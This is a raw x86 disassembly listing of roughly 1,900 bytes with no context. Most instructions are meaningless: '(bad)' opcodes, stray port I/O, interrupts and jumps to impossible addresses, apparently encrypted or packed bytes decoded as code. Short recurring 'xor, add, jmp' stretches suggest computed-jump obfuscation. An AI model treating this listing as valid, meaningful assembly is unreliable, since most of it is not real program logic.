  401991:	pop    ds
  401992:	outs   dx,DWORD PTR ds:[esi]
  401993:	mov    al,0x30
  401995:	mov    eax,ds:0x9ab34dfa
  40199a:	mov    edi,DWORD PTR [edi-0x17aae3a3]
  4019a0:	xor    DWORD PTR [ecx-0x73e9477a],edx
  4019a6:	loopne 0x401990
  4019a8:	test   BYTE PTR [esi+eiz*4+0x65e302d3],al
  4019af:	inc    esp
  4019b0:	test   eax,0xa31e0267
  4019b5:	dec    ecx
  4019b6:	pop    ds
  4019b7:	popf   
  4019b8:	add    al,0xc7
  4019ba:	(bad)  
  4019bb:	cmc    
  4019bc:	jecxz  0x401979
  4019be:	mov    ebp,0x9451b5b4
  4019c3:	jo     0x4019a7
  4019c5:	inc    ebp
  4019c6:	xchg   esi,eax
  4019c7:	push   0xffffff9b
  4019c9:	lahf   
  4019ca:	aas    
  4019cb:	jnp    0x401a0f
  4019cd:	push   ds
  4019ce:	jl     0x401992
  4019d0:	mov    ds:0xc6cfbc06,al
  4019d5:	test   eax,0xc48868b6
  4019da:	(bad)  
  4019db:	mov    al,0x51
  4019dd:	adc    dl,ch
  4019df:	aaa    
  4019e0:	push   edi
  4019e1:	push   esi
  4019e2:	out    dx,eax
  4019e3:	inc    edi
  4019e4:	int    0x80
  4019e6:	mov    bh,0xfb
  4019e8:	iret   
  4019e9:	push   es
  4019ea:	out    0x6e,eax
  4019ec:	test   BYTE PTR [ecx-0x42],ah
  4019ef:	in     al,0x6f
  4019f1:	push   eax
  4019f2:	sbb    BYTE PTR [edi-0x2a702787],0x62
  4019f9:	adc    BYTE PTR [ebp+0x3b],bl
  4019fc:	in     eax,0x9e
  4019fe:	scas   eax,DWORD PTR es:[edi]
  4019ff:	push   0xffffffa1
  401a01:	int    0x5d
  401a03:	push   0x8d55a045
  401a08:	mov    ds:0xea7d9ae1,eax
  401a0d:	das    
  401a0e:	adc    al,0x8c
  401a10:	push   0x75
  401a12:	mov    WORD PTR [edx-0x617c8e58],?
  401a18:	and    edx,DWORD PTR [ebx]
  401a1a:	jae    0x401a1c
  401a1c:	inc    ecx
  401a1d:	aas    
  401a1e:	mov    eax,0xafcca3c6
  401a23:	pop    ebp
  401a24:	in     al,dx
  401a25:	jnp    0x4019ba
  401a27:	mov    bl,0x88
  401a29:	mov    ebx,0xb1c2099a
  401a2e:	sbb    eax,0xeb71d513
  401a33:	repnz icebp 
  401a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a36:	mov    dh,0xd3
  401a38:	int3   
  401a39:	or     BYTE PTR [eax],0xb4
  401a3c:	jae    0x4019f5
  401a3e:	sub    BYTE PTR [eax+0x5a],cl
  401a41:	jge    0x4019ef
  401a43:	cmp    edx,ecx
  401a45:	ja     0x401a40
  401a47:	xchg   edi,eax
  401a48:	mov    ah,0x9
  401a4a:	lahf   
  401a4b:	call   0x8fc2:0x5a11b5df
  401a52:	push   ebx
  401a53:	mov    ds:0xdbc01012,al
  401a58:	fidivr DWORD PTR [edi]
  401a5a:	pop    ebx
  401a5b:	sbb    ebp,ebp
  401a5d:	push   ebp
  401a5e:	ror    BYTE PTR [esi-0x66c2af4d],0xf8
  401a65:	(bad)  
  401a66:	mov    edx,0x1ab25a8c
  401a6b:	mov    dl,0xb0
  401a6d:	sub    DWORD PTR [ecx],ecx
  401a6f:	int    0xac
  401a71:	stos   BYTE PTR es:[edi],al
  401a72:	jnp    0x401a26
  401a74:	mov    ebx,0x5d897435
  401a79:	mov    al,0xe9
  401a7b:	pushf  
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	inc    ecx
  401a8c:	mov    esp,0x780e37f8
  401a91:	jle    0x401b11
  401a93:	cli    
  401a94:	jg     0x401b14
  401a96:	jle    0x401ac4
  401a98:	les    edx,FWORD PTR [ebx-0x7744af64]
  401a9e:	repz sub esi,DWORD PTR [edi+0x3c]
  401aa2:	xchg   esi,eax
  401aa3:	out    0xb3,eax
  401aa5:	jb     0x401ad3
  401aa7:	sbb    edi,DWORD PTR [eax]
  401aa9:	jae    0x401b29
  401aab:	jo     0x401aab
  401aad:	or     DWORD PTR [eax+0x47],esi
  401ab0:	test   ebp,0x8a5d7d2c
  401ab6:	push   cs
  401ab7:	jle    0x401b26
  401ab9:	push   ds
  401aba:	pop    ds
  401abb:	mov    cl,0x2f
  401abd:	fwait
  401abe:	mov    bl,0x1b
  401ac0:	inc    ecx
  401ac1:	dec    ebp
  401ac2:	mov    ecx,0xf5342801
  401ac7:	xrelease xchg BYTE PTR [esi-0x3d],bh
  401acb:	retf   0xe0da
  401ace:	stc    
  401acf:	or     BYTE PTR [edx-0x3e],0x73
  401ad3:	sar    BYTE PTR [edx],cl
  401ad5:	loope  0x401af9
  401ad7:	test   BYTE PTR [esp+ebx*8],ah
  401ada:	add    eax,0xa5289779
  401adf:	fsubr  QWORD PTR [eax]
  401ae1:	mov    eax,ds:0x93d14ed9
  401ae6:	je     0x401ae8
  401ae8:	scas   al,BYTE PTR es:[edi]
  401ae9:	or     BYTE PTR [edx-0x2],bl
  401aec:	jp     0x401b3b
  401aee:	pop    es
  401aef:	mov    cl,0xc
  401af1:	out    dx,eax
  401af2:	mov    ch,0xc7
  401af4:	xchg   esp,eax
  401af5:	sub    esp,DWORD PTR [ebp-0x18af6cd5]
  401afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401afc:	inc    ebp
  401afd:	scas   eax,DWORD PTR es:[edi]
  401afe:	or     BYTE PTR [esi+0x15b1d113],bh
  401b04:	test   al,0x8d
  401b06:	pop    edx
  401b07:	outs   dx,DWORD PTR ds:[esi]
  401b08:	cli    
  401b09:	jmp    0x411c0c57
  401b0e:	adc    dh,BYTE PTR [ebp+0x5a3558b6]
  401b14:	std    
  401b15:	jne    0x401b86
  401b17:	retf   
  401b18:	in     eax,0x72
  401b1a:	sub    al,0x78
  401b1c:	and    BYTE PTR [ebp-0x1d],cl
  401b1f:	add    DWORD PTR ds:0xde911ce7,esi
  401b25:	dec    eax
  401b26:	lds    ebp,FWORD PTR [edi-0x48d3fd33]
  401b2c:	add    eax,0x838958ee
  401b31:	aas    
  401b32:	repnz rol BYTE PTR [esi-0x59],1
  401b36:	ret    0xe307
  401b39:	jle    0x401b0e
  401b3b:	pop    ss
  401b3c:	inc    ebx
  401b3d:	cmc    
  401b3e:	pop    esi
  401b3f:	jbe    0x401b55
  401b41:	cmc    
  401b42:	mov    esi,DWORD PTR [edx]
  401b44:	test   eax,0x78364cff
  401b49:	pop    edx
  401b4a:	stos   BYTE PTR es:[edi],al
  401b4b:	shl    cl,cl
  401b4d:	inc    esp
  401b4e:	stos   BYTE PTR es:[edi],al
  401b4f:	sub    BYTE PTR [ebx-0x7e],ah
  401b52:	push   esp
  401b53:	popa   
  401b54:	cdq    
  401b55:	daa    
  401b56:	xchg   ebx,eax
  401b57:	inc    edi
  401b58:	mov    dl,0x5
  401b5a:	(bad)  
  401b5b:	mov    eax,ds:0x3614023e
  401b60:	xor    BYTE PTR [ecx],cl
  401b62:	fisttp DWORD PTR [esp+0xed6ef8a]
  401b69:	pop    ds
  401b6a:	std    
  401b6b:	add    esp,ecx
  401b6d:	ds inc edx
  401b6f:	out    dx,al
  401b70:	push   ebx
  401b71:	mov    gs,WORD PTR [ecx+0x1f]
  401b74:	add    al,0x3c
  401b76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b77:	push   ecx
  401b78:	inc    eax
  401b79:	jb     0x401b33
  401b7b:	pop    eax
  401b7c:	dec    ebp
  401b7d:	add    bl,BYTE PTR [ecx+0x6eac04c1]
  401b83:	mov    ss,ebp
  401b85:	fiadd  DWORD PTR [ebp+0x42]
  401b88:	xor    bh,BYTE PTR [eax]
  401b8a:	mov    ebx,0x30fcbd84
  401b8f:	or     al,0x46
  401b91:	xchg   BYTE PTR [edi+0x515834b2],cl
  401b97:	fsub   DWORD PTR [edx+0x3a]
  401b9a:	sub    esi,ebp
  401b9c:	inc    ebx
  401b9d:	mov    bl,0x91
  401b9f:	dec    esp
  401ba0:	test   BYTE PTR [ebx-0x3ee6407],dh
  401ba6:	adc    bl,dh
  401ba8:	daa    
  401ba9:	push   esp
  401baa:	xor    DWORD PTR [edx],ebx
  401bac:	imul   ebx,DWORD PTR [ecx-0x70],0xb8c7a4d6
  401bb3:	loopne 0x401c01
  401bb5:	das    
  401bb6:	test   BYTE PTR [edx+ebx*2],ah
  401bb9:	and    edx,DWORD PTR [ecx]
  401bbb:	fmul   QWORD PTR [esi]
  401bbd:	dec    DWORD PTR [ecx+edi*1]
  401bc0:	and    eax,0x61d2cb07
  401bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bc6:	cmp    eax,DWORD PTR [edi-0x18]
  401bc9:	or     bh,0x6f
  401bcc:	cmp    dl,dl
  401bce:	xchg   ebx,eax
  401bcf:	mov    edx,0xd1360615
  401bd4:	outs   dx,DWORD PTR ds:[esi]
  401bd5:	imul   ebx,ebx,0x82e88fda
  401bdb:	test   DWORD PTR [ecx+0x380f2c58],ebx
  401be1:	aaa    
  401be2:	jb     0x401bb4
  401be4:	(bad)  
  401be5:	stc    
  401be6:	jmp    0x768ab095
  401beb:	pop    es
  401bec:	imul   ebp,esi,0xffffff86
  401bef:	or     eax,DWORD PTR [esi+0x304dd274]
  401bf5:	inc    esp
  401bf6:	mov    ds:0x66771a15,al
  401bfb:	ins    DWORD PTR es:[edi],dx
  401bfc:	xchg   edi,eax
  401bfd:	outs   dx,BYTE PTR ds:[esi]
  401bfe:	xchg   edi,eax
  401bff:	mov    eax,0xaf6f005a
  401c04:	mov    al,0xff
  401c06:	ja     0x401c04
  401c08:	loop   0x401bd3
  401c0a:	push   eax
  401c0b:	and    BYTE PTR [ebp+0x65],dh
  401c0e:	fimul  WORD PTR [ebx+0x7c]
  401c11:	add    dl,dl
  401c13:	lock pop ebp
  401c15:	mov    edi,0xa6ff870c
  401c1a:	ror    BYTE PTR [ebx+0x4d8bb045],1
  401c20:	clc    
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	in     eax,dx
  401c41:	push   ss
  401c42:	call   0x7e7e:0x798a
  401c48:	cli    
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401cc5
  401c4d:	out    0x12,al
  401c4f:	push   es
  401c50:	aam    0x3b
  401c52:	adc    DWORD PTR [edi],esp
  401c54:	inc    ebx
  401c55:	les    ebx,FWORD PTR [edi-0x6d3f65ad]
  401c5b:	pushf  
  401c5c:	mov    ebp,0x9f8e5580
  401c61:	adc    eax,DWORD PTR [esi-0x23cb6687]
  401c67:	xchg   edx,eax
  401c68:	aaa    
  401c69:	inc    ebp
  401c6a:	cmp    ah,BYTE PTR [ebp+0x52bf3612]
  401c70:	hlt    
  401c71:	paddsw mm4,mm4
  401c74:	inc    edx
  401c75:	lahf   
  401c76:	xchg   ebp,eax
  401c77:	cdq    
  401c78:	test   eax,0xb9964982
  401c7d:	cwde   
  401c7e:	xchg   BYTE PTR [ebp-0x76],al
  401c81:	retf   
  401c82:	xor    al,0x0
  401c84:	sti    
  401c85:	push   ebp
  401c86:	and    al,BYTE PTR [edx-0x1c]
  401c89:	cmp    ebx,ebx
  401c8b:	cmp    eax,DWORD PTR [ecx-0x62]
  401c8e:	sub    BYTE PTR [ecx],bl
  401c90:	shl    BYTE PTR [ecx],1
  401c92:	lods   al,BYTE PTR ds:[esi]
  401c93:	aam    0xce
  401c95:	mov    eax,0x6b824b60
  401c9a:	jb     0x401cda
  401c9c:	stc    
  401c9d:	test   esp,0xc095f304
  401ca3:	retf   0x325d
  401ca6:	pop    ebx
  401ca7:	retf   
  401ca8:	adc    edi,DWORD PTR [ecx]
  401caa:	hlt    
  401cab:	xor    eax,0x1371036e
  401cb0:	es inc edx
  401cb2:	sbb    DWORD PTR [eax],ebx
  401cb4:	jb     0x401c44
  401cb6:	mov    edi,0x7e3d45c2
  401cbb:	fiadd  DWORD PTR [esi-0x45]
  401cbe:	push   es
  401cbf:	jmp    0xde54f17e
  401cc4:	sbb    DWORD PTR [ecx+0x7c],edi
  401cc7:	cmp    DWORD PTR [esi+0x58e9cd9f],ebx
  401ccd:	sar    BYTE PTR [eax+0x1623eaf],0x10
  401cd4:	jecxz  0x401c56
  401cd6:	inc    esp
  401cd7:	add    esp,ebp
  401cd9:	mov    gs,eax
  401cdb:	mov    cl,0xf8
  401cdd:	push   ss
  401cde:	add    ecx,DWORD PTR [esp+edx*2]
  401ce1:	cmp    al,0xb6
  401ce3:	pusha  
  401ce4:	jbe    0x401d23
  401ce6:	pop    ds
  401ce7:	mov    ds:0x3d6ad413,al
  401cec:	into   
  401ced:	lock pop ebp
  401cef:	loop   0x401cc7
  401cf1:	or     cl,BYTE PTR [edi+eax*1]
  401cf4:	sbb    bl,BYTE PTR [eax-0x45f321b0]
  401cfa:	add    al,0xc8
  401cfc:	xor    BYTE PTR [ebx],dh
  401cfe:	out    dx,eax
  401cff:	adc    edx,DWORD PTR [eax+0x5e]
  401d02:	fidiv  WORD PTR [ebx+0x36]
  401d05:	loopne 0x401cbc
  401d07:	add    eax,0x7788e000
  401d0c:	mov    ah,0xf2
  401d0e:	cs xchg ecx,eax
  401d10:	imul   esp,DWORD PTR [edi],0xffffff87
  401d13:	mov    dh,0x70
  401d15:	pop    ebp
  401d16:	adc    al,0x9
  401d18:	(bad)  [eax-0x43]
  401d1b:	inc    DWORD PTR [ecx-0x735ca666]
  401d21:	das    
  401d22:	clc    
  401d23:	gs pusha 
  401d25:	mov    dh,0x17
  401d27:	out    dx,eax
  401d28:	jp     0x401d8d
  401d2a:	cmp    DWORD PTR [eax],esi
  401d2c:	in     al,dx
  401d2d:	(bad)  
  401d2e:	dec    ebx
  401d2f:	sub    ch,BYTE PTR [esp+eiz*2+0x6951daf8]
  401d36:	scas   al,BYTE PTR es:[edi]
  401d37:	push   edi
  401d38:	aad    0xe9
  401d3a:	neg    BYTE PTR [esi]
  401d3c:	out    0x18,al
  401d3e:	and    al,0x39
  401d40:	or     ecx,DWORD PTR [bp-0xf28]
  401d45:	aad    0x33
  401d47:	dec    edi
  401d48:	jb     0x401d1c
  401d4a:	test   ah,bl
  401d4c:	sahf   
  401d4d:	xor    ecx,DWORD PTR [edi+0x211938b]
  401d53:	push   es
  401d54:	jns    0x401d40
  401d56:	adc    dh,bh
  401d58:	out    dx,eax
  401d59:	ret    
  401d5a:	cmp    ch,bh
  401d5c:	xchg   edx,eax
  401d5d:	mov    ds:0x90769eb1,al
  401d62:	mov    ?,WORD PTR [edi+0x4c]
  401d65:	adc    al,0x42
  401d67:	add    al,0xb9
  401d69:	and    eax,0x15e9883c
  401d6e:	dec    esp
  401d6f:	out    0x36,al
  401d71:	jns    0x401d41
  401d73:	test   al,0xe6
  401d75:	jno    0x401d85
  401d77:	std    
  401d78:	inc    ecx
  401d79:	scas   al,BYTE PTR es:[edi]
  401d7a:	push   edi
  401d7b:	adc    DWORD PTR [esp-0xc6b4587],ecx
  401d82:	cli    
  401d83:	dec    ebx
  401d84:	push   cs
  401d85:	mov    eax,0x38b50e95
  401d8a:	pop    ss
  401d8b:	nop
  401d8c:	mov    al,ds:0x3d93aa0a
  401d91:	das    
  401d92:	ret    
  401d93:	aad    0x7c
  401d95:	add    ebx,DWORD PTR [ebp+edx*2-0x72]
  401d99:	mov    ecx,0xc34cb2a1
  401d9e:	ror    BYTE PTR [eax+0x210a9058],cl
  401da4:	push   esp
  401da5:	xchg   esi,eax
  401da6:	scas   eax,DWORD PTR es:[edi]
  401da7:	push   es
  401da8:	cmp    BYTE PTR [ecx+eax*2-0x6c],ah
  401dac:	lock add al,0xdd
  401daf:	xor    ax,WORD PTR [eax+0x6d5fc46]
  401db6:	mov    ebx,esp
  401db8:	sahf   
  401db9:	push   ecx
  401dba:	out    dx,al
  401dbb:	ins    BYTE PTR es:[edi],dx
  401dbc:	scas   eax,DWORD PTR es:[edi]
  401dbd:	and    eax,0xde062601
  401dc2:	out    0x76,al
  401dc4:	inc    ebx
  401dc5:	test   DWORD PTR [esp+ecx*4],eax
  401dc8:	add    bl,BYTE PTR [ecx-0x4ba37ccc]
  401dce:	inc    ebp
  401dcf:	rol    BYTE PTR [ebx],cl
  401dd1:	(bad)  
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0xc865ac8],ebp
  401e0d:	popf   
  401e0e:	push   ss
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e6d
  401e17:	lods   al,BYTE PTR ds:[esi]
  401e18:	sti    
  401e19:	jg     0x401db7
  401e1b:	push   ecx
  401e1c:	mov    DWORD PTR [ebp+0x27b3d14b],0xb2f7d4f2
  401e26:	ins    DWORD PTR es:[edi],dx
  401e27:	pop    ebp
  401e28:	dec    esi
  401e29:	aaa    
  401e2a:	loope  0x401e46
  401e2c:	mov    edi,DWORD PTR [eax]
  401e2e:	push   edx
  401e2f:	mov    edx,?
  401e31:	jge    0x401e89
  401e33:	not    BYTE PTR [ecx]
  401e35:	hlt    
  401e36:	iret   
  401e37:	icebp  
  401e38:	and    al,0x82
  401e3a:	stc    
  401e3b:	mov    dl,BYTE PTR [edx+ecx*2]
  401e3e:	cwde   
  401e3f:	fist   DWORD PTR [ebp+0x7ddfde4a]
  401e45:	retf   0x7457
  401e48:	dec    edi
  401e49:	jb     0x401e72
  401e4b:	int    0x33
  401e4d:	out    0x5d,eax
  401e4f:	pushf  
  401e50:	stc    
  401e51:	sub    BYTE PTR [edx+edx*1+0xe],dl
  401e55:	and    edx,DWORD PTR [eax+0xf1d343d]
  401e5b:	nop
  401e5c:	retf   0x243b
  401e5f:	pop    es
  401e60:	pop    ebx
  401e61:	cmp    BYTE PTR [eax+0x5403ef5d],ah
  401e67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e68:	jmp    0x401eb5
  401e6a:	nop
  401e6b:	mov    WORD PTR [bp+si+0x71],es
  401e6f:	push   esp
  401e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e71:	ins    DWORD PTR es:[edi],dx
  401e72:	sbb    DWORD PTR [edi],edx
  401e74:	out    dx,eax
  401e75:	jp     0x401eaa
  401e77:	inc    ecx
  401e78:	xchg   esi,eax
  401e79:	cdq    
  401e7a:	in     al,0x6d
  401e7c:	test   eax,0x29eddb6b
  401e81:	add    ch,BYTE PTR [edi+edx*2]
  401e84:	iret   
  401e85:	aaa    
  401e86:	adc    ch,bl
  401e88:	loope  0x401ef2
  401e8a:	int    0x61
  401e8c:	fiadd  WORD PTR [ecx-0x80]
  401e8f:	rol    ecx,cl
  401e91:	xchg   ch,al
  401e93:	bound  ebp,QWORD PTR [ecx+edx*4+0x2f4b23f2]
  401e9a:	cld    
  401e9b:	xchg   edi,ebp
  401e9d:	rcr    ebx,0x49
  401ea0:	cmp    al,0xae
  401ea2:	jmp    DWORD PTR [esi+0x6]
  401ea5:	and    al,0x94
  401ea7:	push   0xa62f92bc
  401eac:	cmp    esi,ebp
  401eae:	cld    
  401eaf:	jb     0x401e88
  401eb1:	div    BYTE PTR [ecx-0x7d887f29]
  401eb7:	cmp    ebp,DWORD PTR [edx]
  401eb9:	verw   WORD PTR [ebx]
  401ebc:	stc    
  401ebd:	push   ds
  401ebe:	push   ebx
  401ebf:	push   edx
  401ec0:	(bad)  
  401ec1:	mov    bl,0xa3
  401ec3:	lahf   
  401ec4:	push   es
  401ec5:	hlt    
  401ec6:	push   edi
  401ec7:	and    dh,ch
  401ec9:	in     al,0x10
  401ecb:	inc    ebx
  401ecc:	hlt    
  401ecd:	mov    ecx,0xa151e170
  401ed2:	call   0x1e0d:0x45282a9
  401ed9:	and    BYTE PTR [ecx+0x1a7b2368],0x3c
  401ee0:	push   ecx
  401ee1:	popa   
  401ee2:	xchg   esp,eax
  401ee3:	dec    ebp
  401ee4:	xchg   ebp,eax
  401ee5:	xchg   DWORD PTR [eax-0x7173d786],edx
  401eeb:	fs adc al,0x4f
  401eee:	mov    BYTE PTR [edi+0x2b],bl
  401ef1:	es popf 
  401ef3:	shr    DWORD PTR [esi+0x6e27c04e],1
  401ef9:	mov    eax,eax
  401efb:	dec    edx
  401efc:	ffree  st(5)
  401efe:	jb     0x401f34
  401f00:	fidivr DWORD PTR [ecx]
  401f02:	mov    BYTE PTR [ebp+0x5a],0x20
  401f06:	push   esi
  401f07:	cmp    DWORD PTR [ecx+eiz*2+0x3d7f24bf],ebp
  401f0e:	xchg   BYTE PTR [edi-0x4b],ch
  401f11:	aad    0xbe
  401f13:	dec    ebx
  401f15:	iret   
  401f16:	scas   eax,DWORD PTR es:[edi]
  401f17:	lea    ebx,ds:0x82b85171
  401f1e:	xor    edx,0x3d87be68
  401f24:	mov    eax,0xb23a93f2
  401f29:	(bad)  
  401f2a:	rol    DWORD PTR [ebx],cl
  401f2c:	(bad)  
  401f2d:	xlat   BYTE PTR ds:[ebx]
  401f2e:	lock mov edi,cs
  401f31:	dec    esp
  401f32:	sahf   
  401f33:	xor    al,0xb6
  401f35:	imul   ebx,ecx,0xffffffef
  401f38:	lods   eax,DWORD PTR ds:[esi]
  401f39:	lahf   
  401f3a:	cs sub eax,0xfcc5df55
  401f40:	jne    0x401fa2
  401f42:	xor    BYTE PTR [esi-0x5b74a393],bl
  401f48:	(bad)  
  401f49:	ficomp DWORD PTR [edx]
  401f4b:	mov    ebp,0x272fbca7
  401f50:	and    ax,0x6f04
  401f54:	sbb    al,0xe7
  401f56:	leave  
  401f57:	mov    al,0x47
  401f59:	pop    ecx
  401f5a:	mov    cl,0x1f
  401f5c:	enter  0xc989,0x38
  401f60:	pusha  
  401f61:	inc    ebp
  401f62:	mov    edx,0x1fea8cb3
  401f67:	into   
  401f68:	in     al,dx
  401f69:	cli    
  401f6a:	shr    BYTE PTR ds:0x494246fc,cl
  401f70:	aam    0xb1
  401f72:	outs   dx,BYTE PTR ds:[esi]
  401f73:	pusha  
  401f74:	inc    eax
  401f75:	push   0xffffffca
  401f77:	lock cmp esi,DWORD PTR [esi]
  401f7a:	cld    
  401f7b:	pop    esi
  401f7c:	rcr    BYTE PTR [eax],1
  401f7e:	pop    es
  401f7f:	jge    0x401f55
  401f81:	fwait
  401f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f83:	sbb    esp,DWORD PTR [edx+esi*8]
  401f86:	aam    0x8b
  401f88:	test   al,0x62
  401f8a:	mov    cl,0x7c
  401f8c:	in     eax,0x34
  401f8e:	xor    DWORD PTR [esp+ebp*1+0x4cb2cb98],esp
  401f95:	shl    DWORD PTR [esi+0xf032a5f],1
  401f9b:	test   BYTE PTR [ebp+0x3],ch
  401f9e:	add    BYTE PTR [eax],al
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x5cbf81b8
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f7d
  401fcc:	(bad)  
  401fcd:	(bad)  
  401fce:	int3   
  401fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fd0:	jmp    0xa4774862
  401fd5:	lock and BYTE PTR [esi+ecx*1+0xc9fee7a],cl
  401fdd:	inc    esi
  401fde:	inc    esp
  401fdf:	pop    ss
  401fe0:	je     0x401f92
  401fe2:	(bad)  
  401fe3:	loopne 0x402045
  401fe5:	mov    al,0xe9
  401fe7:	lds    eax,FWORD PTR [ebx+0x329c0708]
  401fed:	sub    eax,0x6a2b3bd7
  401ff2:	pop    edx
  401ff3:	out    dx,al
  401ff4:	sub    eax,0x8950e30f
  401ff9:	sbb    al,0xf9
  401ffb:	pop    ebp
  401ffc:	xchg   edx,eax
  401ffd:	jo     0x402015
  401fff:	rcr    DWORD PTR [esi],0x23
  402002:	stos   DWORD PTR es:[edi],eax
  402003:	sbb    ebx,0x3a9a4f2a
  402009:	jbe    0x401fc6
  40200b:	mov    eax,0xa3baba5c
  402010:	jecxz  0x401f93
  402012:	xchg   esp,eax
  402013:	retf   
  402014:	jno    0x401fbc
  402016:	inc    edx
  402017:	ds add al,0x95
  40201a:	retf   
  40201b:	lock pop edx
  40201d:	ror    BYTE PTR [ebp+0x1ba8ded2],0xc3
  402024:	stc    
  402025:	leave  
  402026:	bound  ebx,QWORD PTR [ecx]
  402028:	mov    DWORD PTR [ecx],edi
  40202a:	jmp    0xc45512de
  40202f:	inc    esi
  402030:	push   0x652174d8
  402035:	jns    0x40206c
  402037:	sti    
  402038:	push   ebx
  402039:	inc    ebp
  40203a:	aam    0xe
  40203c:	sub    eax,0xcf3593f7
  402041:	or     al,0xad
  402043:	popa   
  402044:	icebp  
  402045:	int    0x2e
  402047:	fnstsw WORD PTR [edi-0x1a]
  40204a:	and    ch,BYTE PTR [ebp-0x11]
  40204d:	out    0xad,al
  40204f:	push   esi
  402050:	lahf   
  402051:	lods   al,BYTE PTR ds:[esi]
  402052:	or     eax,edi
  402054:	pop    ds
  402055:	pop    ebp
  402056:	test   eax,eax
  402058:	out    dx,eax
  402059:	xlat   BYTE PTR ds:[ebx]
  40205a:	hlt    
  40205b:	add    esp,DWORD PTR [edx-0xbd06b35]
  402061:	scas   eax,DWORD PTR es:[edi]
  402062:	pop    edx
  402063:	inc    esp
  402064:	rol    DWORD PTR [ebx+0x78491335],0xf7
  40206b:	pop    esi
  40206c:	pushf  
  40206d:	pop    ds
  40206e:	push   eax
  40206f:	inc    esp
  402070:	ins    BYTE PTR es:[edi],dx
  402071:	enter  0x66ab,0x31
  402075:	mov    ebx,0x904bb6f2
  40207a:	sub    BYTE PTR [edx],0xdc
  40207d:	dec    ecx
  40207e:	pusha  
  40207f:	(bad)
  402082:	adc    ecx,edx
  402084:	inc    ebp
  402085:	popa   
  402086:	or     BYTE PTR [ecx-0x56dec687],dl
  40208c:	cmc    
  40208d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40208e:	add    eax,0xbff4066a
  402093:	test   BYTE PTR [esi-0xd353ab6],0x7d
  40209a:	xor    edi,DWORD PTR [ecx+ebp*4-0x4fa59303]
  4020a1:	add    BYTE PTR [ecx-0xd],0xdc
  4020a5:	mov    ebx,0x335fb9fa
  4020aa:	retf   0x33ef
  4020ad:	xor    edi,edi
  4020af:	mov    dh,0x6e
  4020b1:	xor    si,WORD PTR ds:0x659f9774
  4020b8:	mov    edi,0xb63cc7de
  4020bd:	xchg   edx,eax
  4020be:	jge    0x40211a
  4020c0:	fidivr WORD PTR [edi-0x438a4536]
  4020c6:	mov    ds:0xf78858c2,eax
  4020cb:	pop    ds
  4020cc:	in     al,0xe2
  4020ce:	dec    ebp
  4020cf:	xchg   edi,eax
  4020d0:	repz jmp 0x25e5d43b
  4020d6:	in     eax,dx
  4020d7:	jge    0x4020b1
  4020d9:	outs   dx,BYTE PTR ds:[esi]
  4020da:	sub    cl,bl
  4020dc:	mov    dh,0xde
  4020de:	jns    0x40211a
  4020e0:	repnz xchg ecx,eax
  4020e2:	cmp    bl,BYTE PTR [edi-0xa4e5817]
  4020e8:	(bad)  
  4020e9:	loopne 0x40212a
  4020eb:	inc    edx
  4020ec:	inc    ebp
  4020ed:	ss jge 0x402128
  4020f0:	adc    esi,ebx
  4020f2:	mov    ah,0x7f
  4020f4:	mov    ds:0x73fb7300,eax
  4020f9:	jl     0x402143
  4020fb:	imul   edi,DWORD PTR [edx+0x667f851e],0xaba7117a
  402105:	mov    ss,WORD PTR [esi+0x16]
  402108:	mov    dh,0x84
  40210a:	or     eax,edi
  40210c:	fs stc 
  40210e:	xchg   esi,eax
  40210f:	dec    edi
  402110:	pop    ss
  402111:	loope  0x4020b5
  402113:	inc    edi
  402114:	into   
  402115:	fisttp DWORD PTR [ecx-0xa]
  402118:	cmp    esi,DWORD PTR [edx]
  40211a:	xchg   ecx,eax
  40211b:	xchg   edx,eax
